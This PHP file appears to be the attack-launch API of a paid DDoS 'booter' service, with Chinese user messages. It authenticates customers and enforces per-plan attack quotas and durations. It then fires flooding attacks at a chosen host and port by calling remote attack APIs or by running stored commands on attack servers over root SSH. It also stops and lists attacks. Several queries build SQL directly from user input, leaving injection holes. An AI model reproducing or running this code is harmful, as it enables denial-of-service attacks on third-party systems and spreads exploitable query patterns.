<?php 
//Header
ob_start();
require_once '@/config.php';
require_once '@/init.php';

    if (empty($_GET['username']) || empty($_GET['password']) || empty($_GET['host']) || empty($_GET['time']) || empty($_GET['port']) || empty($_GET['method'])) {
            exit('<font color=#ff0000>Error prompt=></font><br><br>请确认所有字段：<br>http://域名/api2.php?username=账号&password=密码&host=[IP]&port=[端口]&time=[时间]&method=[模式]');
        }

$ID='chong1';
$email='chong3';
$username=$_GET['username'];

        if(empty($_COOKIE["$username"])){$_COOKIE["$username"]=0;}
        $c=$_COOKIE["$username"];

        if($c>3){
        exit('<b><font color=#ff0000>Error prompt=></font><br>您<font color=#ff0000>'.$c.'</font>次输入密码错误!次数较多,请10分钟后再试</b>');
        }


$password=$_GET['password'];
$password=SHA1(MD5($password));

$host   = $_GET['host'];
$port   = intval($_GET['port']);
$time   = intval($_GET['time']);
$method = $_GET['method'];


        $SQLGetLogs = $odb->query("SELECT * FROM `users` WHERE `username` = '$username'AND `password`='$password'");
                                    while ($getInfo = $SQLGetLogs->fetch(PDO::FETCH_ASSOC)) {
                                      
                                        $ID=$getInfo['ID'];
                                        $email=$getInfo['email'];
                                        $pansID=intval($getInfo['membership']);
                                        $_SESSION['ID']=$ID;
                                     }


         if($ID=='chong1'||$email=='chong3'){
        $_COOKIE["$username"]?($c=$_COOKIE["$username"]+1):($c=1);
        setCookie("$username",$c,time()+10*60);
            exit( "<b><font color=#ff0000>Error prompt=></font><br>您第"."<font color=#ff0000>".$c."</font>次输入密码错误，还有<font color=#32CD32>".(3-$c)."</font>次机会</b>");
         }


//chong---------------
$type ='start';
 



//Start attack function
if ($type == 'start' || $type == 'renew') {

    //查询当下会员次数
    $plansql = $odb -> prepare("SELECT `plans`.`cishu`,`users`.`cishu` as 'ucishu' FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`ID` = :id");
    $plansql -> execute(array(":id" => $_SESSION['ID']));
    $rowxd = $plansql -> fetch(); 
    
    if ($rowxd['ucishu'] >0) {
        $huiyuancis = $rowxd['ucishu'];
    }else{
        $huiyuancis = $rowxd['cishu']; 
    }
    //查询今日次数
    $SQLSelect = $odb -> query("SELECT * FROM `gjcs` WHERE uid =".$_SESSION['ID']." AND shijian=".strtotime(date('Y-m-d',time())));
    $yicishu = 0;
    while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
    {
        $yicishu++;
    }

    if ($huiyuancis<$yicishu) {
        die(error('您今日的剩余攻击次数已经用完，明天再继续吧！'));
    }

    if ($type == 'start') {
        //Get, set and validate!
        $host   = $_GET['host'];
        $port   = intval($_GET['port']);
        $time   = intval($_GET['time']);
        $method = $_GET['method'];
        //Verifying all fields
        if (empty($host) || empty($time) || empty($port) || empty($method)) {
            die(error('请确认所有字段'));
        }
        //Check if the method is legit
        if (!ctype_alnum(str_replace(' ', '', $method))) {
            die(error('方法是不可用的'));
        }
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
        $SQL -> execute(array(':method' => $method));
        $countMethod = $SQL -> fetchColumn(0);
        if ($countMethod == 0) {
            die(error('方法是不可用的'));
        }
        //Check if the host is a valid url or IP
        $SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
        $SQL -> execute(array(':method' => $method));
        $type = $SQL -> fetchColumn(0);
        if ($type == 'layer7') {
            if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                die(error('Host这不是一个有效的网址.'));
            }
            $parameters = array(
                ".gov",
                ".edu",
                "$",
                "{",
                "%",
                "<"
            );
            foreach ($parameters as $parameter) {
                if (strpos($host, $parameter)) {
                    die('You are not allowed to attack these kind of websites!');
                }
            }
        } elseif (!filter_var($host, FILTER_VALIDATE_IP)) {
                die(error('Host这不是一个有效的IP地址'));
            }
        //Check if host is blacklisted
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host' AND `type` = 'victim'");
        $SQL -> execute(array(':host' => $host));
        $countBlacklist = $SQL -> fetchColumn(0);
        if ($countBlacklist > 0) {
            die(error('Host被列入黑名单'));
        }
    } else {
        $renew     = intval($_GET['id']);
        $SQLSelect = $odb->prepare("SELECT * FROM `logs` WHERE `id` = :renew");
        $SQLSelect -> execute(array(':renew' => $renew));
        while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
            $host   = $show['ip'];
            $port   = $show['port'];
            $time   = $show['time'];
            $method = $show['method'];
            $userr  = $show['user'];
        }
        if (!($userr == $username) && !$user->isAdmin($odb)) {
            die(error('这不是你的攻击'));
        }
    }
    //Check concurrent attacks
    if ($user->hasMembership($odb)) {
        $SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
        $SQL -> execute(array(':username' => $username));
        $countRunning = $SQL -> fetchColumn(0);
        if ($countRunning >= $stats->concurrents($odb, $username)) {
            die(error('你有太多的攻击正在运行.'));
        }
    }
    //Check max boot time
    $SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
    $SQLGetTime->execute(array(
        ':id' => $_SESSION['ID']
    ));
    $maxTime = $SQLGetTime->fetchColumn(0);
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $maxTime = 60;
    }
    if ($time > $maxTime) {
        die(error('已超过您的最大开机时间.'));
    }
    //Check open slots
    if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
        die(error('没有空闲的服务器.你的攻击.'));
    }
    //Check if test boot has been launched
    if (!($user->hasMembership($odb))) {
    $testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
    if ($testboots == 1 && $testattack > 0) {
        die(error('你已经启动了你的测试攻击'));
        }
    }
    //Check if the system is API
    if ($system == 'api') {
        //Check rotation
        $i            = 0;
        $SQLSelectAPI = $odb->prepare("SELECT * FROM `api` WHERE `methods` LIKE :method ORDER BY RAND()");
        $SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
            $count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $i++;
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]',
                '[method]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
                $method
            );
            $APILink      = $show['api'];
            $handler[]    = $show['name'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
        if ($i == 0) {
            die(error('没有空闲的服务器，你的攻击'));
        }
    }
    //Use Attacking Servers
    else {
        //Check rotation
        $i                = 0;
        $SQLSelectServers = $odb->prepare("SELECT * FROM `servers` WHERE `methods` LIKE :method ORDER BY RAND()");
        $SQLSelectServers -> execute(array(':method' => "%{$method}%"));
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            if ($rotation == 1 && $i > 0) {
                break;
            }
            $name = $show['name'];
            $count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);
            if ($count >= $show['slots']) {
                continue;
            }
            $SQL      = $odb->prepare("SELECT `command` FROM `methods` WHERE `name` = :method");
            $SQL -> execute(array(':method' => $method));
            $command = $SQL -> fetchColumn(0);
            $arrayFind    = array(
                '{$host}',
                '{$port}',
                '{$time}',
                '{$method}'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time,
                $method
            );
            $command      = str_replace($arrayFind, $arrayReplace, $command);
            $handler[]    = $show['name'];
            $ip           = $show['ip'];
            $password     = $show['password'];
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('无法连接到服务器!请在几分钟后再试一次.'));
            }
            $ssh->exec($command . ' > /dev/null &');
            $i++;
        }
    }
    if ($i == 0) {
        die(error('没有空闲的服务器，你的攻击'));
    }



    //End of attacking servers script
    $handlers     = @implode(",", $handler);
    //Insert Logs
    $insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :port, :time, :method, UNIX_TIMESTAMP(), '0', :handler)");
    $insertLogSQL->execute(array(
        ':user' => $username,
        ':ip' => $host,
        ':port' => $port,
        ':time' => $time,
        ':method' => $method,
        ':handler' => $handlers
    ));
    //Insert test attack
    if (!($user->hasMembership($odb)) && $testboots == 1) {
        $SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
    }

    $SQLinsert = $odb -> prepare("INSERT INTO `gjcs` VALUES(NULL, :uid, :shijian)");
    $SQLinsert -> execute(array(':uid' => $_SESSION['ID'], ':shijian' =>strtotime(date('Y-m-d',time()))));

    echo success('攻击发送 '.$host.':'.$port.'');
}

//Stop attack function
if ($type == 'stop') {
    $stop      = intval($_GET['id']);
    $SQL       = $odb->query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `id` = '$stop'");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $host   = $show['ip'];
        $port   = $show['port'];
        $time   = $show['time'];
        $method = $show['method'];
        $handler = $show['handler'];
        $command  = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
    }
    $handlers = explode(",", $handler);
    foreach ($handlers as $handler)
    {
    if ($system == 'api') {
        $SQLSelectAPI = $odb->query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {
            $arrayFind    = array(
                '[host]',
                '[port]',
                '[time]'
            );
            $arrayReplace = array(
                $host,
                $port,
                $time
            );
            $APILink      = $show['api'];
            $APILink      = str_replace($arrayFind, $arrayReplace, $APILink);
            $stopcommand  = "&method=stop";
            $stopapi      = $APILink . $stopcommand;
            $ch           = curl_init();
            curl_setopt($ch, CURLOPT_URL, $stopapi);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            curl_exec($ch);
            curl_close($ch);
        }
    } else {
        $SQLSelectServers = $odb->query("SELECT * FROM `servers` WHERE `name` = '$handler'");
        while ($show = $SQLSelectServers->fetch(PDO::FETCH_ASSOC)) {
            $ip       = $show['ip'];
            $password = $show['password'];
            $command2 = 'pkill -f "'.$command.'"';
            include('Net/SSH2.php');
            define('NET_SSH2_LOGGING', NET_SSH2_LOG_COMPLEX);
            $ssh = @new Net_SSH2($ip);
            if (!$ssh->login('root', $password)) {
                die(error('<strong>ERROR: </strong>无法连接到攻击服务器!请在几分钟后再试一次.'));
            }
            $ssh->exec($command2.' > /dev/null &');
        }
    }
    }
    echo success('攻击已被停止!');
}


if ($type == 'attacks') {

            if (isset($_POST['ping']))
            {
            header('Location: ../index.php');
            }
            ?>
             <table class="table table-striped">
            <tbody>
                  <tr>
                <th><center>目标</center></th>
                <th><center>端口</center></th>
                <th><center>方法</center></th>
                <th><center>过期</center></th>
                <th><center>行动</center></th>
                <tr>
                                                
                                                </tr>
                  </tr>
<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE user='{$_SESSION['username']}' ORDER BY `id` DESC LIMIT 5");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
        $dios    = htmlspecialchars($ip);
        $expires = $date + $time - time();
        if ($expires < 0 || $show['stopped'] != 0) {
            $countdown = "过期";
        } else { 
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
     attacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
      } 
        if ($show['time'] + $show['date'] > time() and $show['stopped'] != 1) {
            $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st"  class="btn btn-xs btn-effect-ripple btn-danger">
                                                                    <span class="btn-ripple animate"></span><i class="fa fa-power-off"></i>暂停
                                                                    </button>';
        } else {
            $action = '
            <button type="button" id="rere" onclick="renew(' . $rowID . ')" class="btn btn-xs btn-effect-ripple btn-success">
                                                                    <span class="btn-ripple animate"></span><i class="fa fa-refresh"></i>更新
                                                                    </button>';
        }
           ?>      
           
           <tr>
            <td><center><?php echo $dios ?></center></td>
            <td><center><?php echo $port ?></center></td>
            <td><center><?php echo $method ?></center></td>
            <td><center><?php echo $countdown ?></center></td>
            <td><center><?php echo $action ?></center></td>
            
           </tr>
   <?php
   }
?> 
              </tbody></table>
<?php 
}

if ($type == 'adminattacks' && $user -> isAdmin($odb)) {
?>
              <table class="table table-striped">
                <thead>
                  <tr>
                    <th>用户</th>
                    <th>目标</th>
                    <th>方法</th>
                    <th>过期</th>
                    <th>暂停</th>
                  </tr>
                </thead>
                <tbody>
<?php 
    $SQLSelect = $odb->query("SELECT * FROM `logs` WHERE `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0 ORDER BY `id` DESC LIMIT 5");
    while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
        $user      = $show['user'];
        $ip      = $show['ip'];
        $port    = $show['port'];
        $time    = $show['time'];
        $method  = $odb->query("SELECT `fullname` FROM `methods` WHERE `name` = '{$show['method']}' LIMIT 1")->fetchColumn(0);
        $rowID   = $show['id'];
        $date    = $show['date'];
        $expires = $date + $time - time();
        if ($expires < 0 || $show['stopped'] != 0) {
            $countdown = "Expired";
        } else {
            $countdown = '<div id="a' . $rowID . '"></div>';
            echo '
<script id="ajax">
var count=' . $expires . ';
var counter=setInterval(a' . $rowID . ', 1000);
function a' . $rowID . '()
{
  count=count-1;
  if (count <= 0)
  {
     clearInterval(counter);
     adminattacks();
     return;
  }
 document.getElementById("a' . $rowID . '").innerHTML=count;
}
</script>
';
        }
            $action = '<button type="button" onclick="stop(' . $rowID . ')" id="st" class="btn btn-danger"><i class="fa fa-power-off"></i>暂停</button>';
        echo '<tr><td>'.$user.'</td><td>' . htmlspecialchars($ip) . ':'.$port.'</td><td>' . $method . '</td><td>' . $countdown . '</td><td>' . $action . '</td></tr>';
    }
?> 
                </tbody>
              </table>
<?php 
    if (empty($show)) {
    echo '没有运行的攻击';
    }
}
?>